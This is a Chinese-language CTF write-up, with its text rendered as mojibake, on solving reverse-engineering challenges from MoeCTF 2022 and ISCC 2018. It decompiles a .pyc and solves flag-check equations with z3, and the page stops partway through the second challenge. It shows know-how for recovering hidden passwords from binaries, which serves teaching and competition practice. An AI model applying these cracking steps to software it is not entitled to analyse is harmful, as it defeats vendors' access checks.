<p><a target="_blank" rel="noopener" href="https://github.com/XDSEC/moeCTF_2022">XDSEC/MoeCTF_2022:
MoeCTF 2022 Challenges and Writeups (github.com)</a></p>
<h2 id="reverse">reverse</h2>
<h3 id="equationpy">EquationPy</h3>
<p>pythoné€†å‘</p>
<h4 id="pycä¸py">pycä¸py</h4>
<p>åœ¨å†™æ•°æ®åº“ä¸Šæœºä½œä¸šæ—¶,å·²ç»é‡è§è¿‡pycæ–‡ä»¶äº†</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€admin</span><br><span class="line">â”‚  â”‚  admin.py</span><br><span class="line">â”‚  â”‚  __init__.py</span><br><span class="line">â”‚  â”‚</span><br><span class="line">â”‚  â””â”€__pycache__</span><br><span class="line">â”‚          admin.cpython-38.pyc</span><br><span class="line">â”‚          __init__.cpython-38.pyc</span><br></pre></td></tr></table></figure>
<p>æ‰€æœ‰pycæ–‡ä»¶éƒ½æ”¾åˆ°<code>__pycache__</code>ç›®å½•ä¸‹é¢,ä¸”pycæ–‡ä»¶éƒ½æ˜¯å’Œå…¶çˆ¶ç›®å½•ä¸­çš„pyæ–‡ä»¶ä¸€ä¸€å¯¹åº”çš„</p>
<p>æ¯”å¦‚è¿™é‡Œadmin.pyå¯¹åº”åˆ°admin.cpython-38.pyc</p>
<p>æ—¢ç„¶cacheæ˜¯ç¼“å­˜çš„æ„æ€,é‚£ä¹ˆå¯ä»¥æ¨æµ‹,pycæ˜¯pyæ–‡ä»¶ç¼–è¯‘å½¢æˆçš„,ç”¨æ¥åŠ é€Ÿè¿è¡Œçš„.å› ä¸ºç›´æ¥è¿è¡Œç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å¿…ç„¶æ¯”è§£é‡Šè¿è¡Œpyæºæ–‡ä»¶å¿«</p>
<p>æŸ¥é˜…èµ„æ–™:</p>
<blockquote>
<p>pycæ˜¯ä¸€ç§äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ˜¯ç”±pyæ–‡ä»¶ç»è¿‡ç¼–è¯‘åï¼Œç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ˜¯ä¸€ç§byte
codeï¼Œpyæ–‡ä»¶å˜æˆpycæ–‡ä»¶åï¼ŒåŠ è½½çš„é€Ÿåº¦æœ‰æ‰€æé«˜ï¼Œè€Œä¸”pycæ˜¯ä¸€ç§è·¨å¹³å°çš„å­—èŠ‚ç ï¼Œæ˜¯ç”±pythonçš„è™šæ‹Ÿæœºæ¥æ‰§è¡Œçš„ï¼Œè¿™ä¸ªæ˜¯ç±»ä¼¼äºJAVAæˆ–è€….NETçš„è™šæ‹Ÿæœºçš„æ¦‚å¿µã€‚pycçš„å†…å®¹ï¼Œæ˜¯è·Ÿpythonçš„ç‰ˆæœ¬ç›¸å…³çš„ï¼Œä¸åŒç‰ˆæœ¬ç¼–è¯‘åçš„pycæ–‡ä»¶æ˜¯ä¸åŒçš„ï¼Œ3.7ç¼–è¯‘çš„pycæ–‡ä»¶ï¼Œ3.6ç‰ˆæœ¬çš„
pythonæ˜¯æ— æ³•æ‰§è¡Œçš„ã€‚</p>
</blockquote>
<h4 id="pythonå‘½ä»¤è¡Œç¼–è¯‘">pythonå‘½ä»¤è¡Œç¼–è¯‘</h4>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m py_compile main.py</span><br></pre></td></tr></table></figure>
<p>è¿™æ¡å‘½ä»¤æ‰§è¡Œä¹‹åå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå­ç›®å½•<code>__pycache__</code>,å…¶ä¸­å°±æœ‰main.cpython-38.pycæ–‡ä»¶</p>
<p>è¿™ä¸ªç©æ„å„¿é•¿å•¥æ ·?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110123037633.png"
alt="image-20221110123037633" />
<figcaption aria-hidden="true">image-20221110123037633</figcaption>
</figure>
<h4 id="åç¼–è¯‘">åç¼–è¯‘</h4>
<p>å¯ä»¥ä½¿ç”¨<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">åœ¨çº¿ç½‘ç«™</a>åç¼–è¯‘</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨uncompyle6åç¼–è¯‘,ä½†æ˜¯åœ¨æˆ‘ç”µè„‘ä¸Šç›´æ¥å¡æ­»</p>
<p>ç”¨åœ¨çº¿ç½‘ç«™åç¼–è¯‘ä¹‹åå¾—åˆ°çš„æ˜¯ä¸€ä¸ª</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Maybe z3 can help you solve this challenge.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Now give me your flag, and I will check for you.&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">22</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">7072</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">2523</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6714</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">8810</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6796</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">2647</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1347</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">1289</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">8917</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">2304</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5001</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2882</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7232</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3192</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9676</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5436</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4407</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6269</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">9623</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">6230</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">6292</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">57</span> == <span class="number">10743134</span> <span class="keyword">and</span> ...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">5926</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9095</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2048</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4639</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3035</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9560</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1591</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2392</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1812</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6732</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">9454</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8175</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7346</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6333</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9812</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">2034</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">6634</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1762</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7058</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">3524</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">7462</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">11</span> == <span class="number">11118093</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congratulate!!!You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;What a pity...Please try again &gt;__&lt;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸­é—´çœå»äº†ä¸€å¤§æ®µçº¦æŸæ¡ä»¶,å› ä¸ºæ²¡æœ‰ç¼©è¿›,æ ¼å¼å¾ˆä¹±,å¯ä»¥åœ¨ä¸€ä¸ªandä¸Šctrl+f2é€‰æ‹©æ‰€æœ‰and,ç„¶åç§»åŠ¨å…‰æ ‡åˆ°andæœ€åæŒ‰å›è½¦,ç›¸å¯¹äºåˆšæ‰ç¨å¾®æ˜æœ—ç‚¹äº†</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110161830590.png"
alt="image-20221110161830590" />
<figcaption aria-hidden="true">image-20221110161830590</figcaption>
</figure>
<p>å®é™…ä¸Šæ•´ä¸ªæ˜¯ä¸€ä¸ª22å…ƒä¸€æ¬¡æ–¹ç¨‹ç»„,æ€ä¹ˆè§£è¿™ä¸ªæ–¹ç¨‹ç»„å‘¢?z3</p>
<h4 id="z3æ¨¡å—">Z3æ¨¡å—</h4>
<p>z3ç”¨äºåœ¨çº¦æŸæ¡ä»¶ä¸‹æ±‚ä¸€ç»„è§£</p>
<h5 id="pythonå®‰è£…z3æ¨¡å—">pythonå®‰è£…z3æ¨¡å—</h5>
<p>å®˜ç½‘<a target="_blank" rel="noopener" href="https://pypi.org/project/z3-solver/">z3-solver Â·
PyPI</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure>
<p>ä¹‹åå°±å¯ä»¥åœ¨pythonä¸­ä½¿ç”¨äº†</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<h5 id="ä½¿ç”¨">ä½¿ç”¨</h5>
<p><a target="_blank" rel="noopener" href="https://blog.shi1011.cn/learn/1789">ä»CTFå…¥é—¨z3 solver -
ç¿»è½¦é±¼ (shi1011.cn)</a></p>
<p>[<a
target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266921.htm">åŸåˆ›]Z3æ±‚è§£çº¦æŸå™¨åŠä¾‹é¢˜-CTFå¯¹æŠ—-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a></p>
<p><a
target="_blank" rel="noopener" href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">Z3Py
Guide (ericpony.github.io)</a></p>
<p><a
target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1423409">Z3ç®€ä»‹åŠåœ¨é€†å‘é¢†åŸŸçš„åº”ç”¨
- è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p>
<h5 id="åŸºæœ¬ç±»å‹">åŸºæœ¬ç±»å‹</h5>
<table>
<thead>
<tr>
<th>Z3ç±»å‹</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>Int</td>
<td>æ•´æ•°</td>
</tr>
<tr>
<td>Bool</td>
<td>å¸ƒå°”</td>
</tr>
<tr>
<td>Array</td>
<td>æ•°ç»„</td>
</tr>
<tr>
<td>BitVec</td>
<td>ä½åŸŸ</td>
</tr>
<tr>
<td>Real</td>
<td>å®æ•°</td>
</tr>
</tbody>
</table>
<h5 id="åŸºæœ¬è¯­å¥">åŸºæœ¬è¯­å¥</h5>
<table>
<thead>
<tr>
<th>åŸºæœ¬è¯­å¥</th>
<th>æ„ä¹‰</th>
<th>ä¾‹å­</th>
</tr>
</thead>
<tbody>
<tr>
<td>Solver</td>
<td>åˆ›å»ºä¸€ä¸ªæ±‚è§£å™¨,å¯ä»¥æ·»åŠ çº¦æŸæ¡ä»¶</td>
<td>s=Solver()</td>
</tr>
<tr>
<td>add</td>
<td>æ·»åŠ çº¦æŸæ¡ä»¶</td>
<td></td>
</tr>
<tr>
<td>check</td>
<td>æ£€æŸ¥åœ¨ç»™å®šçº¦æŸæ¡ä»¶ä¸‹æ˜¯å¦æœ‰è§£</td>
<td></td>
</tr>
<tr>
<td>model</td>
<td>æ±‚å‡ºæ»¡è¶³æ‰€æœ‰çº¦æŸæ¡ä»¶çš„ä¸€ä¸ªè§£</td>
<td></td>
</tr>
</tbody>
</table>
<p>æ¯”å¦‚æƒ³è¦æ±‚è§£æ¤­åœ†<span
class="math inline">\(\frac{x^2}{25}+\frac{y^2}{16}=1\)</span>ä¸ç›´çº¿<span
class="math inline">\(y=x-1\)</span>åœ¨yè½´å³ä¾§çš„ä¸€ä¸ªç„¦ç‚¹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(x*x/<span class="number">25</span>+y*y/<span class="number">16</span>==<span class="number">1</span>)<span class="comment">#çº¦æŸæ¤­åœ†æ–¹ç¨‹</span></span><br><span class="line">s.add(y==x-<span class="number">1</span>)<span class="comment">#çº¦æŸç›´çº¿æ–¹ç¨‹</span></span><br><span class="line">s.add(x&gt;<span class="number">0</span>)<span class="comment">#çº¦æŸyè½´å³ä¾§</span></span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x = 3.6949050343?, y = 2.6949050343?]</span><br></pre></td></tr></table></figure>
<h5 id="iscc-2018-reverse-my-math-is-bad">ISCC-2018 reverse-My math is
bad</h5>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=======================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;= Welcome to the flag access machine! =&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=   Input the password to login ...   =&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=======================================&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You should get the flag...&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong password!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¨å±€ä½ç½®æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²input,é¦–å…ˆcheckä¼šæ£€æŸ¥input,å¦‚æœé€šè¿‡,åˆ™è°ƒç”¨flagå‡½æ•°ç»™å‡ºflag,å…¶ä¸­checkå’Œflagä¸­éƒ½æœ‰åŠ å¯†</p>
<p>è¿™ä¸ªè¾“å…¥çš„å­—ç¬¦ä¸²inputåœ¨bssèŠ‚[0x6020A0,0x6020C0)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221002154256280.png"
alt="image-20221002154256280" />
<figcaption aria-hidden="true">image-20221002154256280</figcaption>
</figure>
<p><strong>check</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">check</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+30h] [rbp-50h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-48h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+50h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// è¦æ±‚inputé•¿32ä¸ªå­—èŠ‚</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(input) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v1 = unk_6020B0;                              <span class="comment">// 0x30303030</span></span><br><span class="line">  v2 = unk_6020B4;</span><br><span class="line">  v3 = unk_6020B8;</span><br><span class="line">  v4 = unk_6020BC;</span><br><span class="line">  <span class="comment">// çº¦æŸæ¡ä»¶1</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_6020A4 * (__int64)*(<span class="type">int</span> *)input - dword_6020AC * (__int64)dword_6020A8 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// çº¦æŸæ¡ä»¶2</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3LL</span> * dword_6020A8 + <span class="number">4LL</span> * dword_6020AC - dword_6020A4 - <span class="number">2LL</span> * *(<span class="type">int</span> *)input != <span class="number">0x17B85F06</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// çº¦æŸæ¡ä»¶3</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * *(<span class="type">int</span> *)input * (__int64)dword_6020AC - dword_6020A8 * (__int64)dword_6020A4 != <span class="number">0x2E6E497E6415CF3E</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// çº¦æŸæ¡ä»¶4</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">27LL</span> * dword_6020A4 + *(<span class="type">int</span> *)input - <span class="number">11LL</span> * dword_6020AC - dword_6020A8 != <span class="number">0x95AE13337</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  srand(dword_6020A8 ^ dword_6020A4 ^ *(_DWORD *)input ^ dword_6020AC);</span><br><span class="line">  v5 = rand() % <span class="number">50</span>;</span><br><span class="line">  v6 = rand() % <span class="number">50</span>;</span><br><span class="line">  v7 = rand() % <span class="number">50</span>;</span><br><span class="line">  v8 = rand() % <span class="number">50</span>;</span><br><span class="line">  v9 = rand() % <span class="number">50</span>;</span><br><span class="line">  v10 = rand() % <span class="number">50</span>;</span><br><span class="line">  v11 = rand() % <span class="number">50</span>;</span><br><span class="line">  v12 = rand() % <span class="number">50</span>;</span><br><span class="line">  <span class="comment">// çº¦æŸæ¡ä»¶5</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 * v6 + v1 * v5 - v2 - v3 != <span class="number">0xE638C96D3</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  <span class="comment">// çº¦æŸæ¡ä»¶6,7,8</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 + v1 + v3 * v8 - v2 * v7 == <span class="number">0xB59F2D0CB</span>LL</span><br><span class="line">    &amp;&amp; v1 * v9 + v2 * v10 - v3 - v4 == <span class="number">0xDCFE88C6D</span>LL</span><br><span class="line">    &amp;&amp; v3 * v12 + v1 - v2 - v4 * v11 == <span class="number">0xC076D98BB</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‰å››ä¸ªçº¦æŸæ¡ä»¶ç»„æˆæ–¹ç¨‹ç»„å¯ä»¥ç¡®å®šè¾“å…¥çš„å‰å››ä¸ªåŒå­—,</p>
<p>åé¢çš„srandç§å­å°±æ˜¯å‰å››ä¸ªåŒå­—çš„å¼‚æˆ–,ä¹Ÿå¯ä»¥ç¡®å®šäº†,ç„¶åäº§ç”Ÿçš„v5~v12éšæœºæ•°ä¹Ÿå¯ä»¥ç¡®å®šäº†,</p>
<p>ä¸‹é¢çš„è¿ç®—åˆå¯ä»¥æ ¹æ®å››ä¸ªçº¦æŸæ¡ä»¶ç¡®å®šåå››ä¸ªåŒå­—</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221002153303248.png" /></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_6020A4 * (__int64)*(<span class="type">int</span> *)input - dword_6020AC * (__int64)dword_6020A8 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªåŒå­—å’Œç¬¬äºŒä¸ªåŒå­—çš„ç§¯å‡å»ç¬¬ä¸‰ä¸ªåŒå­—å’Œç¬¬å››ä¸ªåŒå­—çš„ç§¯å¾—æ˜¯0x24CDF2E7C953DA56</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çº¦æŸæ¡ä»¶2</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="number">3LL</span> * dword_6020A8 + <span class="number">4LL</span> * dword_6020AC - dword_6020A4 - <span class="number">2LL</span> * *(<span class="type">int</span> *)input != <span class="number">0x17B85F06</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_12;</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
(3*input[8:11]+4*input[12:15])-(1*input[4:7]+2*input[0:3])=17B85F06h
\]</span></p>
<p>å‰å››ä¸ªçº¦æŸæ¡ä»¶å°±å¯ä»¥å†™æˆ:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword0*dword1-dword2*dword3==0x24CDF2E7C953DA56</span><br><span class="line">(3*dword2+4*dword3)-(1*dword1+2*dword0)==0x17B85F06</span><br><span class="line">3*dword0*dword3-dword2*dword1==0x2E6E497E6415CF3E</span><br><span class="line">(27*dword1+dword0)-(11*dword3+dword2)==0x95AE13337</span><br></pre></td></tr></table></figure>
<p>å†™z3è„šæœ¬è§£æ–¹ç¨‹</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dword0=Int(<span class="string">&#x27;dword0&#x27;</span>)</span><br><span class="line">dword1=Int(<span class="string">&#x27;dword1&#x27;</span>)</span><br><span class="line">dword2=Int(<span class="string">&#x27;dword2&#x27;</span>)</span><br><span class="line">dword3=Int(<span class="string">&#x27;dword3&#x27;</span>)</span><br><span class="line">solve(</span><br><span class="line">    dword0*dword1-dword2*dword3==<span class="number">0x24CDF2E7C953DA56</span>,</span><br><span class="line">    (<span class="number">3</span>*dword2+<span class="number">4</span>*dword3)-(<span class="number">1</span>*dword1+<span class="number">2</span>*dword0)==<span class="number">0x17B85F06</span>,</span><br><span class="line">    <span class="number">3</span>*dword0*dword3-dword2*dword1==<span class="number">0x2E6E497E6415CF3E</span>,</span><br><span class="line">    (<span class="number">27</span>*dword1+dword0)-(<span class="number">11</span>*dword3+dword2)==<span class="number">0x95AE13337</span>,</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœ</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\reverse&gt; python exp.py</span><br><span class="line">[dword3 = <span class="number">862734414</span>,</span><br><span class="line"> dword1 = <span class="number">1801073242</span>,</span><br><span class="line"> dword2 = <span class="number">829124174</span>,</span><br><span class="line"> dword0 = <span class="number">1869639009</span>]</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢è§£å‡ºv5~v12çš„éšæœºæ•°å€¼</p>
